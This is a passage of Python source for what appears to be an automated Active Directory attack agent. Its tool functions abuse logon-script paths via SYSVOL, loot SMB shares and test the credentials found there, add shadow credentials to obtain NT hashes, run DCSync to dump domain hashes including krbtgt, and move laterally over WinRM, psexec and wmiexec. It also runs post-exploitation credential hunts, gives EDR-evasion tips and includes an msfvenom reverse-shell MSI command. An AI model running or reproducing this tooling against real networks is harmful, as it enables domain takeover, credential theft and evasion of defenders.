                            script_content: str = "") -> str:
    """Plan or execute scriptPath logon-script abuse for writable user objects."""
    target = str(target_user or "").strip().strip("'\"")
    if target.lower() in {"", "found", "target", "unknown", "all", "account", "user"}:
        return "Logon script abuse skipped: no concrete writable target_user was provided."
    if not _real_user_target(target):
        return (
            f"Logon script abuse skipped: '{target}' is not a real interactive user "
            "sAMAccountName target. This tool requires ACL evidence on a user object, "
            "not a DNS/container/builtin/gMSA/computer object."
        )
    gmsa_target = _known_gmsa_name(target)
    if gmsa_target or target.endswith("$"):
        canonical = gmsa_target or target
        return (
            f"Logon script abuse skipped: '{target}' is a gMSA/computer-style account, "
            "not an interactive user logon-script target. Use ACL evidence instead: "
            f"if current rights include GenericWrite/GenericAll/WriteDACL on {canonical}, "
            "call gmsa_takeover; if only ReadGMSAPassword exists, call gmsa_read."
        )
    if _same_ad_account(target, username):
        replacement = ""
        for right, candidate in _agent_intel().get("acl_paths", []):
            if (any(x in str(right).lower() for x in ("genericwrite", "writeproperty", "scriptpath"))
                    and _real_user_target(candidate)
                    and not _known_gmsa_name(candidate)
                    and not _same_ad_account(candidate, username)
                    and not str(candidate).endswith("$")):
                replacement = str(candidate).strip().strip("'\"")
                break
        if replacement:
            target = replacement
        else:
            return (
                f"Logon script abuse skipped: only self-target '{target}' is available. "
                "This path is target-agnostic, but it needs a different writable user "
                "object to create a useful pivot. Continue with ACL/BloodHound enumeration."
            )
    script_name = Path(str(script_name or f"adstrike_{secrets.token_hex(4)}.bat")).name
    results = [f"=== LOGON SCRIPT ABUSE: {target} -> {script_name} ==="]

    if _real_secret(password):
        list_cmd = (
            f"smbclient //{dc_ip}/SYSVOL "
            f"-U {shell_quote(domain + chr(92) + username + '%' + password)} "
            f"-c {shell_quote('cd ' + domain + '/scripts; ls')} 2>&1"
        )
        sysvol_ls = _run(list_cmd, timeout=20)
        results.append(f"--- SYSVOL scripts ---\n{sysvol_ls[:1000]}")
        if script_content:
            local_script = Path("/tmp") / script_name
            local_script.write_text(script_content, encoding="utf-8", errors="ignore")
            put_cmd = (
                f"smbclient //{dc_ip}/SYSVOL "
                f"-U {shell_quote(domain + chr(92) + username + '%' + password)} "
                f"-c {shell_quote('cd ' + domain + '/scripts; put ' + str(local_script) + ' ' + script_name)} 2>&1"
            )
            put_out = _run(put_cmd, timeout=25)
            results.append(f"--- upload {script_name} ---\n{put_out[:1000]}")

    fqdn = _dc_host_for_kerberos(domain, dc_ip)
    auth, env = _bloodyad_auth(domain, username, password, nt_hash, dc_ip)

    if auth and script_content:
        set_cmd = f"{shell_quote(_bin('bloodyAD'))} {auth} set object {shell_quote(target)} scriptPath -v {shell_quote(script_name)}"
        try:
            r = subprocess.run(f"{_faketime_prefix()}{set_cmd}", shell=True, capture_output=True, text=True,
                               timeout=30, env=env)
            set_out = _strip_ansi((r.stdout + r.stderr).strip())
        except Exception as e:
            set_out = f"[ERROR] {e}"
        results.append(f"--- set scriptPath ---\n{set_out[:1200]}")
    else:
        results.append(
            "No script_content supplied, so not modifying AD. Exploit plan:\n"
            f"1. Upload {script_name} to //{dc_ip}/SYSVOL/{domain}/scripts\n"
            f"2. Run: bloodyAD --host {fqdn} -d {domain} -u {username} -p <password> "
            f"set object {target} scriptPath -v {script_name}\n"
            "3. Wait for/trigger target user logon, then pivot with the resulting shell."
        )

    SESSION.setdefault("agent_intel", {}).setdefault("script_path_edges", [])
    edge = {"user": target, "scriptPath": script_name}
    if edge not in SESSION["agent_intel"]["script_path_edges"]:
        SESSION["agent_intel"]["script_path_edges"].append(edge)
    add_finding("Logon Script Abuse Path", "Critical",
                f"Writable user {target} can be pointed at SYSVOL logon script {script_name}",
                "Remove write rights on user scriptPath and restrict SYSVOL script writes")
    return "\n".join(results)[:4000]


def tool_auto_loot_chain(dc_ip: str, domain: str, username: str, password: str) -> str:
    """
    Full automated chain:
    Share loot → credential parse → clock-skew bypass → shadow creds → NT hash → WinRM
    """
    SESSION.update({"dc_ip": dc_ip, "domain": domain,
                    "username": username, "password": password})

    out_parts = []

    # ── Step 1: enumerate + download shares ───────────────────────────────────
    shares_raw = _nxc(f"smb {dc_ip} -u '{username}' -p '{password}' -d {domain} --shares", timeout=20)
    readable = re.findall(r"([\w\$\-]+)\s+READ", shares_raw)
    skip = {"NETLOGON","SYSVOL","IPC$","ADMIN$","C$","print$"}

    loot_dir = Path("/tmp/agent_loot_chain")
    all_files: list[Path] = []
    for share in readable:
        if share in skip:
            continue
        dest = loot_dir / share
        dest.mkdir(parents=True, exist_ok=True)
        old_cwd = os.getcwd()
        os.chdir(dest)
        _run(f"smbclient //{dc_ip}/{share} -U '{domain}\\{username}%{password}' "
             f"-c 'prompt OFF; recurse ON; mget *' 2>/dev/null", timeout=30)
        os.chdir(old_cwd)
        all_files.extend(f for f in dest.rglob("*") if f.is_file())

    out_parts.append(f"Readable shares: {readable}")
    out_parts.append(f"Files downloaded: {len(all_files)}")

    # ── Step 2: parse credentials from files ──────────────────────────────────
    raw_creds: list[dict] = []
    text_exts = {".log",".txt",".conf",".config",".ini",".xml",".json",".ps1",".bat",".cmd",".env",""}
    for f in all_files:
        if f.suffix.lower() not in text_exts:
            continue
        try:
            content = f.read_text(errors="ignore")
        except Exception:
            continue
        for cred in _extract_creds_from_text(content):
            raw_creds.append({**cred, "source": str(f)})

    out_parts.append(f"Credentials found in files: {len(raw_creds)}")

    # ── Step 3: test credentials with clock-skew bypass ──────────────────────
    dc_time_raw = _run(f"curl -s --max-time 5 -I http://{dc_ip}", timeout=8)
    dc_local_ts = ""
    for line in dc_time_raw.splitlines():
        if line.lower().startswith("date:"):
            try:
                from email.utils import parsedate_to_datetime
                import datetime as _dt
                dt = parsedate_to_datetime(line[5:].strip())
                dc_utc    = dt.strftime("%Y-%m-%d %H:%M:%S")
                dc_dt     = _dt.datetime.strptime(dc_utc, "%Y-%m-%d %H:%M:%S")
                utc_now   = _dt.datetime.utcnow()
                local_now = _dt.datetime.now()
                delta     = dc_dt - utc_now
                fake_local = local_now + delta + _dt.timedelta(seconds=5)
                dc_local_ts = fake_local.strftime("%Y-%m-%d %H:%M:%S")
            except Exception:
                pass

    tgt_py = os.path.expanduser("~/.local/bin/getTGT.py")
    if not Path(tgt_py).exists():
        tgt_py = "/usr/share/doc/python3-impacket/examples/getTGT.py"

    def _probe_cred(u: str, p: str) -> tuple[str, str]:
        smb_args = ["nxc", "smb", dc_ip, "-u", u, "-p", p, "-d", domain]
        try:
            smb_out = subprocess.run(smb_args, capture_output=True, text=True, timeout=15).stdout
        except Exception:
            smb_out = ""
        if "[+]" in smb_out and "STATUS_" not in smb_out:
            return "valid_ntlm", ""
        # Kerberos test
        if dc_local_ts and Path(tgt_py).exists() and shutil.which("faketime"):
            ccache_tmp = f"/tmp/{u}_{int(time.time())}.ccache"
            args = ["faketime", dc_local_ts, "/usr/bin/python3", tgt_py,
                    f"{domain}/{u}:{p}", "-dc-ip", dc_ip]
            try:
                r = subprocess.run(args, capture_output=True, text=True, timeout=20)
                krb_out = r.stdout + r.stderr
                if "Saving ticket" in krb_out:
                    default = f"{u}.ccache"
                    if Path(default).exists():
                        shutil.move(default, ccache_tmp)
                    return "valid_kerb", ccache_tmp
            except Exception:
                pass
        return "invalid", ""

    valid_creds = []
    seen = set()
    for c in raw_creds:
        u, p = c["user"], c["password"]
        if not u or not p:
            continue
        for candidate in [p] + _password_year_variants(p):
            key = f"{u}:{candidate}"
            if key in seen:
                continue
            seen.add(key)
            result, ccache_path = _probe_cred(u, candidate)
            if result in ("valid_ntlm", "valid_kerb"):
                out_parts.append(f"VALID CRED [{result}]: {u}:{candidate}")
                cred = {"user": u, "password": candidate, "auth": result}
                if ccache_path:
                    cred["ccache"] = ccache_path
                valid_creds.append(cred)
                intel_store = SESSION.setdefault("agent_intel", {})
                intel_store.setdefault("valid_creds", [])
                intel_store.setdefault("creds_in_files", [])
                if cred not in intel_store["valid_creds"]:
                    intel_store["valid_creds"].append(cred)
                cred_pair = (u, candidate)
                if cred_pair not in intel_store["creds_in_files"]:
                    intel_store["creds_in_files"].append(cred_pair)
                owned_user = {
                    "user": u,
                    "method": "share_credential",
                    "source": c.get("source", ""),
                    "time": datetime.now().isoformat(),
                }
                if not any(x.get("user") == u and x.get("method") == "share_credential"
                           for x in SESSION.setdefault("owned_users", [])):
                    SESSION["owned_users"].append(owned_user)
                add_finding(f"Credential in Share File: {u}", "Critical",
                            f"Valid credential found: {u}:{candidate}",
                            "Rotate credentials; restrict share access")
                break

    if valid_creds:
        best = valid_creds[0]
        # Store found credentials in intel only — do not overwrite the active session user
        intel_store = SESSION.setdefault("agent_intel", {})
        intel_store.setdefault("valid_creds", [])
        for cred in valid_creds:
            if cred not in intel_store["valid_creds"]:
                intel_store["valid_creds"].append(cred)
        out_parts.append(f"Found valid credential: {best['user']} (stored in intel, session user unchanged)")

        acl_out = tool_acl_abuse_scan(
            dc_ip, domain, best["user"], password=best["password"],
        )
        out_parts.append(f"=== ACL scan as {best['user']} ===\n{acl_out[:2500]}")

    # ── Step 4: find GenericWrite targets + Shadow Credentials ────────────────
    dacledit_py = os.path.expanduser("~/.local/bin/dacledit.py")
    certipy_bin = _bin("certipy")
    base_dn = "DC=" + domain.replace(".", ",DC=")

    for cred in valid_creds:
        u, p = cred["user"], cred["password"]

        # Enumerate computers + gMSA as SESSION user (less restricted)
        ldap_args = ["ldapsearch", "-x", "-H", f"ldap://{dc_ip}",
                     "-D", f"{username}@{domain}", "-w", password,
                     "-b", base_dn,
                     "(|(objectClass=computer)(objectClass=msDS-GroupManagedServiceAccount))",
                     "sAMAccountName", "distinguishedName"]
        try:
            ldap_out = subprocess.run(ldap_args, capture_output=True, text=True, timeout=20).stdout
        except Exception:
            ldap_out = ""

        objects = []
        cur = {}
        for line in ldap_out.splitlines():
            if line.startswith("dn:"):
                if cur: objects.append(cur)
                cur = {"dn": line[3:].strip()}
            elif line.lower().startswith("samaccountname:"):
                cur["sam"] = line.split(":",1)[1].strip()
        if cur: objects.append(cur)

        for obj in objects:
            dn, sam = obj.get("dn",""), obj.get("sam","?")
            if not dn: continue
            if not Path(dacledit_py).exists(): continue

            acl_args = ["/usr/bin/python3", dacledit_py, "-action", "read",
                        "-target-dn", dn, f"{domain}/{username}:{password}", "-dc-ip", dc_ip]
            try:
                acl_out = subprocess.run(acl_args, capture_output=True, text=True, timeout=20).stdout
            except Exception:
                acl_out = ""

            lines = acl_out.splitlines()
            for i, line in enumerate(lines):
                if u.lower() in line.lower():
                    window = "\n".join(lines[max(0,i-8):i+2])
                    if re.search(r"GenericAll|GenericWrite|WritePropert", window, re.I):
                        out_parts.append(f"GenericWrite found: {u} → {sam}")
                        acl_path = ("GenericWrite", sam)
                        acl_store = SESSION.setdefault("agent_intel", {}).setdefault("acl_paths", [])
                        if acl_path not in acl_store:
                            acl_store.append(acl_path)

                        # Shadow Credentials via certipy
                        if certipy_bin and dc_local_ts and shutil.which("faketime"):
                            atk_ccache = f"/tmp/{u}_{int(time.time())}.ccache"
                            tgt_args = ["faketime", dc_local_ts, "/usr/bin/python3",
                                        tgt_py, f"{domain}/{u}:{p}", "-dc-ip", dc_ip]
                            tgt_r = subprocess.run(tgt_args, capture_output=True, text=True, timeout=20)
                            if "Saving ticket" in tgt_r.stdout + tgt_r.stderr:
                                default = f"{u}.ccache"
                                if Path(default).exists():
                                    shutil.move(default, atk_ccache)
                                env = {**os.environ, "KRB5CCNAME": atk_ccache}
                                dc_fqdn = SESSION.get("dc_fqdn") or dc_ip

                                # Refresh faketime
                                dc_time_raw2 = _run(f"curl -s --max-time 5 -I http://{dc_ip}", timeout=8)
                                fake2 = dc_local_ts
                                for ln in dc_time_raw2.splitlines():
                                    if ln.lower().startswith("date:"):
                                        try:
                                            from email.utils import parsedate_to_datetime
                                            import datetime as _dt2
                                            dt2 = parsedate_to_datetime(ln[5:].strip())
                                            dc_dt2 = _dt2.datetime.strptime(dt2.strftime("%Y-%m-%d %H:%M:%S"), "%Y-%m-%d %H:%M:%S")
                                            delta2 = dc_dt2 - _dt2.datetime.utcnow()
                                            fake2 = (_dt2.datetime.now() + delta2 + _dt2.timedelta(seconds=5)).strftime("%Y-%m-%d %H:%M:%S")
                                        except Exception:
                                            pass

                                pfx_name = sam.rstrip("$").lower()
                                shadow_args = ["faketime", fake2, certipy_bin, "shadow", "add",
                                               "-u", f"{u}@{domain}", "-k",
                                               "-dc-ip", dc_ip, "-dc-host", dc_fqdn,
                                               "-target", dc_fqdn, "-account", sam]
                                sh_r = subprocess.run(shadow_args, capture_output=True, text=True, timeout=45, env=env)
                                sh_out = sh_r.stdout + sh_r.stderr

                                if "Successfully added Key Credential" in sh_out:
                                    pfx_path = f"/tmp/agent_{pfx_name}.pfx"
                                    if Path(f"{pfx_name}.pfx").exists():
                                        shutil.move(f"{pfx_name}.pfx", pfx_path)

                                    # PKINIT
                                    for stale in [f"{pfx_name}.ccache"]:
                                        Path(stale).unlink(missing_ok=True)

                                    fresh_ts = fake2
                                    dc_time_raw3 = _run(f"curl -s --max-time 5 -I http://{dc_ip}", timeout=8)
                                    for ln3 in dc_time_raw3.splitlines():
                                        if ln3.lower().startswith("date:"):
                                            try:
                                                from email.utils import parsedate_to_datetime
                                                import datetime as _dt3
                                                dt3 = parsedate_to_datetime(ln3[5:].strip())
                                                dc_dt3 = _dt3.datetime.strptime(dt3.strftime("%Y-%m-%d %H:%M:%S"), "%Y-%m-%d %H:%M:%S")
                                                delta3 = dc_dt3 - _dt3.datetime.utcnow()
                                                fresh_ts = (_dt3.datetime.now() + delta3 + _dt3.timedelta(seconds=5)).strftime("%Y-%m-%d %H:%M:%S")
                                            except Exception:
                                                pass

                                    auth_args = ["faketime", fresh_ts, certipy_bin, "auth",
                                                 "-pfx", pfx_path, "-dc-ip", dc_ip,
                                                 "-domain", domain, "-username", sam]
                                    auth_r = subprocess.run(auth_args, capture_output=True,
                                                            text=True, timeout=30, input="y\n")
                                    auth_out = auth_r.stdout + auth_r.stderr

                                    nt_m = re.search(r"[a-f0-9]{32}:([a-f0-9]{32})", auth_out, re.I)
                                    if nt_m:
                                        nt_hash = nt_m.group(1)
                                        out_parts.append(f"NT Hash [{sam}]: {nt_hash}")
                                        SESSION.setdefault("loot",{})[sam] = nt_hash
                                        add_finding("Shadow Creds → NT Hash", "Critical",
                                                    f"{sam} NT hash obtained via shadow credentials",
                                                    "Audit msDS-KeyCredentialLink permissions")

                                        # WinRM test
                                        winrm_out = _run(
                                            f"nxc winrm {dc_ip} -u '{sam}' -H '{nt_hash}' -d {domain}",
                                            timeout=15)
                                        if "Pwn3d" in winrm_out:
                                            out_parts.append(f"WinRM Pwn3d! → {sam}")
                                            out_parts.append(f"evil-winrm -i {dc_ip} -u '{sam}' -H '{nt_hash}'")
                                            _add_owned_machine(
                                                dc_ip, user=sam, nt_hash=nt_hash,
                                                method="Shadow Creds → WinRM",
                                                time=datetime.now().isoformat())

    return "\n".join(out_parts) if out_parts else "Auto chain: no credentials or paths found."


def tool_dcsync(dc_ip: str, domain: str, username: str,
                password: str = "", nt_hash: str = "", target_user: str = "all") -> str:
    secretsdump = _impacket_cmd("secretsdump")
    krb = _session_kerberos_usable(username, domain)
    ccache = SESSION.get("krb5_ccache", "")
    if krb and ccache:
        os.environ["KRB5CCNAME"] = ccache
        auth = f"-k -no-pass {domain}/{username}@{dc_ip}"
    elif password:
        auth = f"{domain}/{username}:'{password}'@{dc_ip}"
    else:
        auth = f"{domain}/{username}@{dc_ip} -hashes :{nt_hash}"
    flag = "-just-dc-ntlm" if target_user == "all" else f"-just-dc-user {target_user}"
    out = _run(f"{secretsdump} {auth} {flag} -outputfile /tmp/agent_dcsync", timeout=120)
    hashes = []
    if Path("/tmp/agent_dcsync.ntds").exists():
        lines = Path("/tmp/agent_dcsync.ntds").read_text().splitlines()
        hashes = [l for l in lines if ":::" in l]
        if hashes:
            add_finding("DCSync — Full Domain Hashes", "Critical",
                        f"{len(hashes)} domain account hashes dumped",
                        "Restrict DS-Replication rights; monitor for 4662 events")
            # Store krbtgt hash for golden ticket
            for line in hashes:
                if line.lower().startswith("krbtgt:"):
                    parts = line.split(":")
                    if len(parts) >= 4:
                        SESSION.setdefault("loot", {})["krbtgt"] = parts[3]
                        SESSION.setdefault("agent_intel", {})["krbtgt_hash"] = parts[3]
            # Store Administrator hash
            for line in hashes:
                if line.lower().startswith("administrator:"):
                    parts = line.split(":")
                    if len(parts) >= 4:
                        SESSION.setdefault("loot", {})["Administrator"] = parts[3]
            _extract_creds_into_session(Path("/tmp/agent_dcsync.ntds").read_text())
            save_session()
        else:
            return f"DCSync produced 0 hashes; no critical finding added.\n{out[:2000]}"
    return f"DCSync output ({len(hashes)} hashes):\n{out[:2000]}\n" + \
           "\n".join(hashes[:20]) + ("\n...[truncated]" if len(hashes) > 20 else "") + \
           ("\n\nNEXT: golden_ticket (krbtgt hash stored in session)" if SESSION.get("loot", {}).get("krbtgt") else "")


def tool_lateral_movement(target_ip: str, domain: str, username: str,
                          password: str = "", nt_hash: str = "",
                          command: str = "whoami /all",
                          method: str = "winrm") -> str:
    """Execute commands on a remote target. Kerberos-aware."""
    fqdn  = SESSION.get("dc_fqdn") or target_ip
    realm = domain.upper()
    krb   = SESSION.get("use_kerberos") and SESSION.get("krb5_ccache")

    if krb:
        ccache   = SESSION["krb5_ccache"]
        nxc_auth = _auth_args_nxc(username, password, nt_hash, domain, target_ip)
        os.environ["KRB5CCNAME"] = ccache
    elif nt_hash:
        nxc_auth = f"-u '{username}' -H '{nt_hash.split(':')[-1]}' -d {domain}"
    else:
        nxc_auth = f"-u '{username}' -p '{password}' -d {domain}"

    # WinRM via nxc -x (works non-interactively, Kerberos-aware)
    if method == "winrm":
        # PowerShell doesn't accept & as command separator — replace with ;
        command = command.replace(" & ", "; ")
        test = _nxc(f"winrm {target_ip} {nxc_auth}", timeout=15)
        if "Pwn3d!" not in test and "Pwn3d" not in test:
            # Try with FQDN for Kerberos
            if krb:
                test = _nxc(f"winrm {fqdn} {nxc_auth}", timeout=15)
            if "Pwn3d!" not in test and "Pwn3d" not in test:
                return f"WinRM access denied\nnxc: {test[:300]}"
        host = fqdn if krb else target_ip
        cmd_out = _nxc(f"winrm {host} {nxc_auth} -x '{command}'", timeout=45)
        add_finding("Remote Command Execution — WinRM", "Critical",
                    f"Command execution on {host} as {domain}\\{username}: {command[:60]}",
                    "Restrict WinRM access; enable JEA; monitor PSRemoting")
        _add_owned_machine(host, user=username, method="WinRM",
                           time=datetime.now().isoformat())
        save_session()
        return f"WinRM [{host}] as {username}:\nCommand: {command}\n{cmd_out[:3000]}"

    elif method == "psexec":
        if krb:
            out = _run(f"{imp('psexec.py')} -k -no-pass {domain}/{username}@{fqdn} "
                       f"'{command}'", timeout=45)
        elif nt_hash:
            out = _run(f"{imp('psexec.py')} {domain}/{username}@{target_ip} "
                       f"-hashes :{nt_hash.split(':')[-1]} '{command}'", timeout=45)
        else:
            out = _run(f"{imp('psexec.py')} {domain}/{username}:'{password}'@{target_ip} "
                       f"'{command}'", timeout=45)
        return f"PSExec [{target_ip}]:\n{out[:3000]}"

    elif method == "wmiexec":
        if krb:
            out = _run(f"{imp('wmiexec.py')} -k -no-pass {domain}/{username}@{fqdn} "
                       f"'{command}'", timeout=45)
        elif nt_hash:
            out = _run(f"{imp('wmiexec.py')} -hashes :{nt_hash.split(':')[-1]} "
                       f"{domain}/{username}@{target_ip} '{command}'", timeout=45)
        else:
            out = _run(f"{imp('wmiexec.py')} {domain}/{username}:'{password}'@{target_ip} "
                       f"'{command}'", timeout=45)
        return f"WMIExec [{target_ip}]:\n{out[:3000]}"

    return "Unknown method"


def tool_windows_privesc_recon(target_ip: str, domain: str, username: str,
                               dc_ip: str = "", password: str = "",
                               nt_hash: str = "") -> str:
    """Post-shell recon: identity, local privesc vectors, credential locations,
    service misconfigs, scheduled tasks, ADCS, WSUS, PSHistory.
    Also detects EDR/AV and adjusts subsequent tool choices accordingly."""
    host = str(target_ip or dc_ip or SESSION.get("dc_ip", "")).strip()
    dc = dc_ip or SESSION.get("dc_ip", host)
    password = _real_secret(password)
    nt_hash = _real_nt_hash(nt_hash)
    auth = _auth_args_nxc(username, password, nt_hash, domain, dc)

    # EDR detection first — critical for real red team to avoid burning tools
    _opsec_sleep(1.0)
    edr_info = _check_edr(host, domain, username, password, nt_hash)
    edr_summary = []
    if edr_info["edr"]:
        edr_summary.append(f"⚠ EDR DETECTED: {', '.join(edr_info['edr'])}")
        edr_summary.append("→ Use native LOLBins; avoid dropping known-bad binaries")
        edr_summary.append("→ Prefer: certutil, wmic, msiexec, rundll32, regsvr32")
        if edr_info["mdi"]:
            edr_summary.append("→ MDI detected: avoid Kerberoasting ALL accounts; use targeted only")
            edr_summary.append("→ MDI detected: avoid rapid LDAP queries; use paged/slow enumeration")

    commands = [
        # Identity & privilege
        ("identity",         "whoami /all"),
        ("net_user",         f"net user {username} /domain 2>NUL"),
        ("local_admins",     "net localgroup Administrators"),
        # Credential hunting
        ("ps_history",       f"type C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>NUL"),
        ("all_ps_history",   "for /f %u in ('dir /b /s C:\\Users\\*ConsoleHost_history.txt 2>NUL') do @type %u 2>NUL"),
        ("cred_files",       'findstr /spin /i "password passwd pwd pass secret key token api" C:\\Users\\* C:\\ProgramData\\* 2>NUL | findstr /v ".exe .dll .sys" | head'),
        ("vnc_reg",          "reg query HKCU\\Software\\TightVNC\\Server 2>NUL & reg query HKLM\\Software\\TigerVNC\\WinVNC4 2>NUL"),
        ("putty_sessions",   "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s 2>NUL | findstr /i \"hostname user password\""),
        # OS & patch level
        ("sys_info",         "systeminfo | findstr /i \"OS Name Version Build Hotfix Domain\""),
        ("missing_patches",  "wmic qfe list brief /format:table 2>NUL | sort"),
        # Local privesc vectors
        ("unquoted_svc",     "wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /iv \"c:\\\\windows\\\\\" | findstr /iv \"\\\"\""),
        ("weak_svc_acl",     "sc qc winmgmt & for /f %s in ('wmic service get name /format:value 2>NUL') do @sc sdshow %s 2>NUL | findstr /i \"WD\""),
        ("writable_paths",   "echo %PATH% & icacls \"C:\\Program Files\" 2>NUL | findstr /i \"Everyone Users Modify Write\""),
        ("alwaysinstallelev","reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>NUL & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>NUL"),
        # ADCS presence
        ("ca_ping",          "certutil -config - -ping 2>NUL"),
        ("cert_stores",      "certutil -store My 2>NUL | findstr /i \"subject issuer\""),
        # Scheduled tasks & services
        ("scheduled_tasks",  "schtasks /query /fo CSV /v 2>NUL | findstr /v \"COM+\\|Task Sched\" | findstr /i \"run system admin\""),
        ("services_running",  "sc query type= all state= running 2>NUL | findstr \"SERVICE_NAME BINARY\""),
        # WSUS / update policy
        ("wsus_policy",      "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /s 2>NUL"),
        # Network
        ("listening_ports",  "netstat -ano | findstr LISTENING"),
        ("hosts_file",       "type C:\\Windows\\System32\\drivers\\etc\\hosts"),
        # Users
        ("users_dir",        "dir C:\\Users\\"),
        ("users_share",      "dir \\\\localhost\\C$\\Users\\ 2>NUL"),
    ]

    results = [f"=== Post-Exploitation Recon: {username}@{host} ==="] + edr_summary
    hints = []
    for label, cmd in commands:
        out = _nxc(f"winrm {shell_quote(host)} {auth} -x {shell_quote(cmd)}", timeout=55)
        if not out or len(out.strip()) < 5:
            continue
        results.append(f"--- {label} ---\n{out[:1200]}")
        low = out.lower()

        # Parse interesting findings into intel
        if label == "ps_history" and any(x in low for x in ("password", "pass", "-cred", "invoke-", "wget", "curl")):
            hints.append("ps_history_creds")
            add_finding("Credential in PSReadLine History", "Critical",
                        f"PowerShell history on {host} contains credential-related commands",
                        "Clear PSHistory; enforce HSTS/TLS; use credential vault")
        if label == "wsus_policy" and any(x in low for x in ("wuserver", "8530", "8531")):
            hints.append("wsus")
            add_finding("WSUS Configuration", "High",
                        f"WSUS policy found on {host} — assess rogue update delivery if HTTP",
                        "Enforce HTTPS for WSUS; validate signing; monitor update delivery")
        if label == "alwaysinstallelev" and "0x1" in out:
            hints.append("always_install_elevated")
            add_finding("AlwaysInstallElevated", "Critical",
                        f"AlwaysInstallElevated enabled on {host} — MSI local privilege escalation possible",
                        "Disable AlwaysInstallElevated in group policy")
        if label == "unquoted_svc" and out.strip():
            hints.append("unquoted_service")
            add_finding("Unquoted Service Path", "High",
                        f"Potential unquoted service path on {host}",
                        "Quote all service binary paths in service configuration")
        if label in {"scheduled_tasks"} and any(x in low for x in ("system", "administrator")):
            hints.append("scheduled_task_system")
        if label == "ca_ping" and "successfully" in low:
            hints.append("adcs_present")
        if label == "vnc_reg" and "password" in low:
            hints.append("vnc_creds")
            add_finding("VNC Password in Registry", "Critical",
                        f"VNC password stored in registry on {host}",
                        "Remove VNC or use certificate auth")

    intel = SESSION.setdefault("agent_intel", {})
    local_hints = intel.setdefault("local_privesc_hints", [])
    for h in hints:
        if h not in local_hints:
            local_hints.append(h)
    save_session()

    if hints:
        results.append(f"\n=== PRIVESC HINTS: {hints} ===")
        tip_map = {
            "ps_history_creds":     "→ Read full PSHistory; extract and test credentials",
            "always_install_elevated": "→ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi | msiexec /quiet /i shell.msi",
            "unquoted_service":     "→ Place binary in unquoted path space; restart service",
            "wsus":                 "→ Assess WSUS HTTP endpoint for rogue update delivery",
            "scheduled_task_system":"→ Inspect task binary ACLs for write access",
            "adcs_present":         "→ Run adcs_scan for ESC misconfigurations",
            "vnc_creds":            "→ Decrypt VNC password: msfconsole -x 'irb; require \"metasploit/framework\"; ::Rex::Proto::RFB::Cipher.decrypt [\"PASSWORD_HEX\"].pack(\"H*\"), \"\\x17\\x52\\x6b\\x06\\x23\\x4e\\x58\\x07\"'",
        }
        for h in hints:
            if h in tip_map:
                results.append(tip_map[h])
    return "\n".join(results)[:9000]


def tool_credential_loot(dc_ip: str, domain: str, username: str,
                         password: str = "", nt_hash: str = "") -> str:
    """Post-exploitation sensitive data collector for real engagements.
    Hunts for credentials, config files, database connection strings, SSH keys,
    and other high-value loot across common locations on the owned machine."""
    host = str(dc_ip or SESSION.get("dc_ip", "")).strip()
    password = _real_secret(password)
    nt_hash = _real_nt_hash(nt_hash)
    auth = _auth_args_nxc(username, password, nt_hash, domain, host)
    results = [f"=== Sensitive Data Hunt: {username}@{host} ==="]

    # --- Pre-flight: confirm this principal can actually EXEC over WinRM before
    # firing 9 loot queries. Accounts that authenticate but are not in Remote
    # Management Users / not local admin cannot run -x, so every query would
    # return an empty [-]. If the passed credential can't exec, fall back to any
    # principal we already own WinRM exec on (populated for ANY engagement via
    # owned_machines), preferring one tied to this host. Fully target-agnostic —
    # nothing here is hardcoded to a specific box.
    probe = _nxc(f"winrm {shell_quote(host)} {auth}", timeout=35)
    if "Pwn3d" not in (probe or ""):
        winrm_owned = [
            m for m in SESSION.get("owned_machines", [])
            if "winrm" in str(m.get("method", "")).lower()
            and str(m.get("user", "")).strip()
            and _real_nt_hash(m.get("nt_hash", ""))
        ]
        winrm_owned.sort(key=lambda m: 0 if str(m.get("machine", "")).strip() in
                         (host, SESSION.get("dc_fqdn", ""), SESSION.get("dc_hostname", "")) else 1)
        for m in winrm_owned:
            fb_user = str(m["user"]).strip()
            fb_hash = _real_nt_hash(m["nt_hash"])
            if fb_user == username:
                continue
            cand_auth = _auth_args_nxc(fb_user, "", fb_hash, domain, host)
            cand_probe = _nxc(f"winrm {shell_quote(host)} {cand_auth}", timeout=35)
            if "Pwn3d" in (cand_probe or ""):
                results.append(f"[*] {username} lacks WinRM exec on {host}; "
                               f"switched to owned principal {fb_user}")
                username, auth, probe = fb_user, cand_auth, cand_probe
                break
        if "Pwn3d" not in (probe or ""):
            results.append(
                f"[-] No WinRM exec rights on {host} for {username} (not in Remote "
                f"Management Users / not local admin). Skipped loot queries — run "
                f"discover_winrm_access or supply an owned principal (gMSA / service "
                f"account) that can -x."
            )
            return "\n".join(results)[:6000]

    loot_commands = [
        # Config files with passwords
        ("web_configs", (
            'findstr /spin /i "connectionstring password passwd" '
            'C:\\inetpub\\* C:\\xampp\\* C:\\wamp\\* C:\\webroot\\* 2>NUL | '
            'findstr /i ".config .xml .ini .env .json" | findstr /v ".log"'
        )),
        ("app_configs", (
            'findstr /spin /i "password passwd pwd" '
            '"C:\\Program Files\\*" "C:\\Program Files (x86)\\*" 2>NUL | '
            'findstr /i ".conf .config .ini .xml .env .cfg"'
        )),
        # Database credentials
        ("db_creds", (
            'findstr /spin /i "Data Source= Server= User Id= Password= mongodb mysql postgres" '
            "C:\\Users\\* C:\\ProgramData\\* C:\\inetpub\\* 2>NUL"
        )),
        # SSH keys
        ("ssh_keys", (
            'for /f %u in (\'dir /b /s "C:\\Users\\*id_rsa" "C:\\Users\\*.pem" '
            '"C:\\Users\\*.ppk" 2>NUL\') do @echo %u'
        )),
        # Credential manager
        ("credential_manager", "cmdkey /list"),
        # Unattend / sysprep (cleartext admin passwords)
        ("sysprep_creds", (
            'for %f in (C:\\Windows\\Panther\\Unattend.xml '
            'C:\\Windows\\Panther\\UnattendedInstall.xml '
            'C:\\Windows\\system32\\sysprep\\sysprep.xml '
            'C:\\Windows\\system32\\sysprep\\Unattend.xml) do '
            '@if exist %f (echo Found: %f & type %f 2>NUL | findstr /i "Password AdministratorPassword")'
